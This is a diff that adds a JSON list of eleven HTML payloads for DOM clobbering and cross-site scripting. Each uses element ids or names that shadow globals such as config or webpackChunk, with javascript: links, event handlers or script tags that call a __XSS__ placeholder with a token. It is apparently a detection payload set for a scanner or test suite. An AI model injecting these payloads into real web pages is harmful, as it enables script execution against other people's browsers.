@@ -1,0 +1,13 @@
+[
+  "<form id=\"config\"><input name=\"url\" value=\"javascript:__XSS__('{{TOKEN}}')\"></form>",
+  "<form id=\"authConfig\"><a id=\"authConfig\" name=\"targetUrl\" href=\"javascript:__XSS__('{{TOKEN}}')\"></a></form>",
+  "<form id=\"settings\"><input name=\"apiUrl\" value=\"javascript:__XSS__('{{TOKEN}}')\"/></form>",
+  "<img id=\"defaultSettings\" name=\"defaultSettings\" src=\"x\" onerror=\"__XSS__('{{TOKEN}}')\">",
+  "<form id=\"webpackChunk\"><input name=\"push\" value=\"\" /></form><script>__XSS__('{{TOKEN}}')</script>",
+  "<form id=\"attributes\"><input name=\"id\" value=\"__XSS__('{{TOKEN}}')\"/></form>",
+  "<form name=\"attributes\" onmouseover=\"__XSS__('{{TOKEN}}')\"><input name=\"tagName\" value=\"IMG\"></form>",
+  "<form id=\"x\" name=\"y\"><input id=\"z\" name=\"inner\" value=\"javascript:__XSS__('{{TOKEN}}')\"></form>",
+  "<a id=\"GLOBAL_CONFIG\" href=\"javascript:__XSS__('{{TOKEN}}')\"></a>",
+  "<form id=\"plugins\"><input name=\"analytics\" value=\"javascript:__XSS__('{{TOKEN}}')\"/></form>",
+  "<dcl id=x><a id=y href=\"javascript:__XSS__('{{TOKEN}}')\"></a></dcl>"
+]
